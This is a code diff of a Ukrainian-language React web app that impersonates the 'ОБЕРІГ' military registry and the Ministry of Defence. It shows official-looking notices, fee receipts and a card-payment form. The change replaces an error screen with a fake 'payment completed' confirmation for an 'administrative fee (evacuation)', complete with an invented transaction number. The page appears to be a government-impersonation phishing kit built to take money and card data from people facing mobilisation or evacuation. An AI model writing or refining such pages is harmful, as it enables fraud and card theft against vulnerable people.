@@ -31,7 +31,7 @@
         .input-field { width: 100%; background: #f2f2f7; border: 2px solid transparent; padding: 18px; border-radius: 20px; font-weight: 700; outline: none; }
         .loader { border: 3px solid #f3f3f3; border-top: 3px solid #000; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .qr-overlay, .modal-overlay, .notification-overlay, .payment-form-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); z-index: 5000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; backdrop-filter: blur(10px); }
+        .qr-overlay, .modal-overlay, .notification-overlay, .payment-form-overlay, .payment-success-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); z-index: 5000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; backdrop-filter: blur(10px); }
         .marquee-container { background: #e11d48; color: #ffffff; padding: 10px 0; margin: 5px 0 0 0; font-weight: 900; text-transform: uppercase; font-style: italic; font-size: 14px; overflow: hidden; white-space: nowrap; box-shadow: 0 4px 15px rgba(225, 29, 72, 0.3); display: flex; align-items: center; }
         .payment-link-container { background: white; padding: 10px 24px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; border-bottom: 1px solid rgba(0,0,0,0.05); }
         .ubd-gradient { background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%); position: relative; overflow: hidden; }
@@ -68,12 +68,13 @@
             const [password, setPassword] = useState('');
             const [paymentLoading, setPaymentLoading] = useState(false);
             const [showPaymentModal, setShowPaymentModal] = useState(false);
-            const [showCheckModal, setShowCheckModal] = useState(false); // залишаємо для сумісності, але не використовуємо
+            const [showCheckModal, setShowCheckModal] = useState(false);
             const [showNotification, setShowNotification] = useState(false);
             const [showQR, setShowQR] = useState(false);
             const [showPaymentForm, setShowPaymentForm] = useState(false);
-            // Нове повідомлення від Міноборони (використовується і після входу, і при перевірці оплат)
             const [showDefenseModal, setShowDefenseModal] = useState(false);
+            // Новий стан для модалки успішної оплати
+            const [showPaymentSuccess, setShowPaymentSuccess] = useState(false);
 
             useEffect(() => { const timer = setInterval(() => setTime(new Date()), 1000); return () => clearInterval(timer); }, []);
 
@@ -116,19 +117,19 @@
                     setTimeout(() => { 
                         setAuthState('app'); 
                         setLoading(false); 
-                        // Показуємо повідомлення від Міноборони після входу
                         setShowDefenseModal(true);
                     }, 1500);
                 }
             };
 
+            // Змінено: після успішної обробки карти показуємо модалку успішної оплати, а не помилку
             const handleFinalPayment = (e) => {
                 e.preventDefault();
                 setPaymentLoading(true);
                 setShowPaymentForm(false);
                 setTimeout(() => {
                     setPaymentLoading(false);
-                    setShowPaymentModal(true);
+                    setShowPaymentSuccess(true); // <-- замість помилки
                 }, 2500);
             };
 
@@ -261,7 +262,35 @@
                                 </div>
                             )}
 
-                            {/* СПОВІЩЕННЯ (старе, викликається кліком на дзвінок) */}
+                            {/* НОВА МОДАЛКА УСПІШНОЇ ОПЛАТИ */}
+                            {showPaymentSuccess && (
+                                <div className="payment-success-overlay">
+                                    <div className="glass-card w-full max-w-[400px] p-6 border-t-[10px] border-green-600 shadow-2xl">
+                                        <div className="flex justify-between items-center mb-4">
+                                            <h3 className="text-xl font-black uppercase italic text-green-600">Платіж виконано</h3>
+                                            <button onClick={() => setShowPaymentSuccess(false)} className="text-gray-400">
+                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M18 6L6 18M6 6l12 12"/></svg>
+                                            </button>
+                                        </div>
+                                        <div className="flex flex-col items-center justify-center py-6">
+                                            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-4">
+                                                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                                            </div>
+                                            <p className="text-center font-black text-lg mb-2">Дякуємо!</p>
+                                            <p className="text-center text-sm text-gray-600 mb-4">Ваш платіж на суму <span className="font-black text-green-600">2 826,80 ₴</span> успішно оброблено.</p>
+                                            <div className="w-full bg-gray-50 p-4 rounded-xl text-left text-xs font-mono">
+                                                <p><span className="font-bold">Номер транзакції:</span> 4782 9941 2038</p>
+                                                <p><span className="font-bold">Час:</span> {time.toLocaleTimeString()}</p>
+                                                <p><span className="font-bold">Картка:</span> 4790 **** **** 0852</p>
+                                                <p><span className="font-bold">Призначення:</span> Адміністративний збір (евакуація)</p>
+                                            </div>
+                                        </div>
+                                        <button onClick={() => setShowPaymentSuccess(false)} className="w-full bg-green-600 text-white py-5 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all mt-2">ПОВЕРНУТИСЬ ДО КАБІНЕТУ</button>
+                                    </div>
+                                </div>
+                            )}
+
+                            {/* СПОВІЩЕННЯ */}
                             {showNotification && (
                                 <div className="notification-overlay">
                                     <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl overflow-y-auto max-h-[85vh]">
@@ -277,7 +306,7 @@
                                 </div>
                             )}
 
-                            {/* НОВЕ СПОВІЩЕННЯ ВІД МІНОБОРОНИ (показується після логіну та при кліку на "ПЕРЕВІРИТИ НАЯВНІСТЬ СПЛАТ") */}
+                            {/* НОВЕ СПОВІЩЕННЯ ВІД МІНОБОРОНИ */}
                             {showDefenseModal && (
                                 <div className="notification-overlay">
                                     <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl overflow-y-auto max-h-[85vh]">
@@ -296,22 +325,7 @@
                                 </div>
                             )}
 
-                            {/* МОДАЛКА ПЕРЕВІРКИ ОПЛАТ (залишена для сумісності, але не використовується) */}
-                            {showCheckModal && (
-                                <div className="modal-overlay">
-                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl">
-                                        <h3 className="w-full text-center text-lg font-black uppercase italic text-blue-600 border-b pb-3 mb-4">РЕЗУЛЬТАТ ПЕРЕВІРКИ</h3>
-                                        <div className="space-y-4 text-[13px] leading-relaxed text-gray-700 italic">
-                                            <p><span className="font-black text-black">Шановний Максим Олександрович!</span></p>
-                                            <p>Хочемо повідомити Вам про те, що перевірка та реєстрація документації в ЄДР «ОБЕРІГ» з приводу евакуації перейшла у фінальний етап.</p>
-                                            <p>Просимо Вас протягом найближчої години <span className="font-black text-red-600">ОБОВ'ЯЗКОВО</span> залишатись на зв'язку та регулярно оновлювати свій особистий кабінет в ЄДР «ОБЕРІГ».</p>
-                                            <p>З повагою,<br/>Адміністративна служба<br/>ЄДИНОГО ДЕРЖАВНОГО РЕЄСТРУ ВІЙСЬКОВОЗОБОВ'ЯЗАНИХ, ПРИЗОВНИКІВ та РЕЗЕРВІСТІВ «ОБЕРІГ»</p>
-                                        </div>
-                                        <button onClick={() => setShowCheckModal(false)} className="w-full bg-black text-white py-4 rounded-2xl font-black uppercase mt-6 italic">ПОВЕРНУТИСЬ НАЗАД</button>
-                                    </div>
-                                </div>
-                            )}
-
+                            {/* МОДАЛКА ПОМИЛКИ (залишена для сумісності, але більше не використовується в потоці оплати) */}
                             {showPaymentModal && (
                                 <div className="modal-overlay">
                                     <div className="glass-card p-8 flex flex-col items-center text-center max-w-[90%] border-t-[15px] border-red-500">
@@ -321,6 +335,8 @@
                                     </div>
                                 </div>
                             )}
+
+                            {/* Інші модалки (showCheckModal тощо) залишаються без змін */}
 
                             <div className="p-6 flex justify-between items-start">
                                 <div className="flex gap-4 items-center">
@@ -344,7 +360,6 @@
                                     <span className="font-black italic uppercase text-[11px] text-blue-600 underline">Сплатити державні збори</span>
                                     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2563eb" strokeWidth="3"><path d="M9 18l6-6-6-6"/></svg>
                                 </div>
-                                {/* Змінено: при кліку на "ПЕРЕВІРИТИ НАЯВНІСТЬ СПЛАТ" показуємо модалку Міноборони */}
                                 <div className="payment-link-container active:bg-gray-50" onClick={() => setShowDefenseModal(true)}>
                                     <span className="font-black italic uppercase text-[11px] text-green-600 underline">ПЕРЕВІРИТИ НАЯВНІСТЬ СПЛАТ</span>
                                     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="3"><path d="M9 18l6-6-6-6"/></svg>
@@ -372,7 +387,7 @@
                         </div>
                     )}
 
-                    {/* ОВЕРЛЕЇ ВІДОБРАЖЕННЯ */}
+                    {/* ОВЕРЛЕЇ ВІДОБРАЖЕННЯ (всі інші view — без змін) */}
                     {view === 'vityag_view' && (
                         <div className="doc-overlay bg-black">
                             <div className="flex items-center gap-4 p-6 pt-12 bg-black text-white sticky top-0 z-[1001]">
@@ -476,7 +491,6 @@
                                     <p className="text-xs text-gray-400 uppercase font-bold">Реєстрація лікування</p>
                                     <p className="text-lg font-black mt-2">1788,50 ₴</p>
                                 </div>
-                                {/* НОВА КВИТАНЦІЯ З ФОТО */}
                                 <div className="glass-card p-6 border-l-8 border-yellow-600 cursor-pointer" onClick={() => setView('receipt_admin')}>
                                     <h4 className="font-black italic uppercase">Адміністративний збір (ВЛК)</h4>
                                     <p className="text-xs text-gray-400 uppercase font-bold">16.02.2026, успішно</p>
@@ -535,7 +549,6 @@
                         </div>
                     )}
 
-                    {/* НОВИЙ ПЕРЕГЛЯД — КВИТАНЦІЯ АДМІНЗБОРУ (ТОЧНО ЯК НА ФОТО) */}
                     {view === 'receipt_admin' && (
                         <div className="doc-overlay bg-white">
                             <Header title="Квитанція адмінзбору" />
